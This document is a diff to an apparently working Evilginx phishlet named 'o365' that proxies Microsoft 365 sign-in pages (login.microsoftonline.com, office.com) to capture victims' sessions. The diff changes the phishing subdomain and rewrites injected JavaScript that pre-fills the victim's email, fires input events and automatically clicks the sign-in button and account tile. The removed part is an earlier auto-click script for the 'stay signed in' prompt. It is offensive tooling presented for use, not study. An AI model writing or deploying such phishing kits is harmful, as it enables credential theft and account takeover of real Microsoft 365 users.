@@ -2,7 +2,7 @@ name: 'o365'
 author: '@NOIR'
 min_ver: '2.3.0'
 proxy_hosts:
-  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'np', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false }
   - {phish_sub: 'www', orig_sub: 'www', domain: 'microsoft.com', session: false, is_landing:false }
   # The lines below are needed if your target organization utilizes ADFS.
@@ -43,24 +43,6 @@ sub_filters:
 
 js_inject:
   - trigger_domains: ["login.microsoftonline.com"]
-    trigger_paths: ["/common/login"]
-    script: |
-      function autoBtnClick(){
-        console.log("trying autoclick");
-      if(document.getElementById("KmsiCheckboxField") != null){
-        console.log("now clicking button ")
-        setTimeout(function(){
-        document.getElementById("idSIButton9").click();
-        console.log("button clicked ");
-        }, 1000);
-      }
-      else{
-       console.log("error auto click trying again");
-      setTimeout(function(){autoBtnClick();}, 1000);
-      }
-      }
-      setTimeout(function(){autoBtnClick();}, 1000);
-  - trigger_domains: ["login.microsoftonline.com"]
     trigger_paths: ["/common/oauth2/"]
     script: |
       var aemail = "";
@@ -71,9 +53,8 @@ js_inject:
         console.log("no cat")
       }
       
-      
-      
       console.log(aemail)
+      
       
       
       
@@ -82,25 +63,38 @@ js_inject:
             console.log("click form...");
             document.getElementById("i0116").click()
             console.log("started...");
-            document.getElementById("i0116").value = aemail;
-            if(document.getElementById("i0116").value != ""){
-              console.log("not null");
+            var emailInput = document.getElementById('i0116');
+            if (emailInput) {
+                emailInput.focus();
+                emailInput.click();
+            var inputElement = document.getElementById("i0116");
+            inputElement.value = aemail;
+            inputElement.dispatchEvent(new Event('input', { bubbles: true }));
+            } else {
+              console.error('Email input element not found');
+            }
+            
       
-             // document.getElementById("idSIButton9").click()
+            if(document.getElementById("i0116").value == aemail){
+              console.log("true , sama");
+              console.log(document.getElementById("i0116").value, aemail);
+        
+             setTimeout(()=>{var e=document.getElementById("idSIButton9");if(e){e.click();var t=setInterval(runScript,500)}else console.error("Element not found")},800);function runScript(){var e=document.getElementById("aadTileTitle");e?e.click():console.error("Element not found")}
+             
             }else{
               console.log("null and not clicked");
             }
             //setTimeout(function(){;},1000)  
-          //  console.log("yes now click")
-          //  setTimeout(function(){document.getElementById("idSIButton9").click();document.getElementById("idSIButton9").click();document.getElementById("idSIButton9").click()},5000)
-          //  console.log("clicked")
+      
       
         }
         catch(err){
           setTimeout(function(){lp();}, 1000);
         }
       }
-      setTimeout(function(){lp();}, 1000);
+      
+      
+      document.addEventListener("DOMContentLoaded",function(){window.addEventListener("load",function(){lp()})});
 
 
 
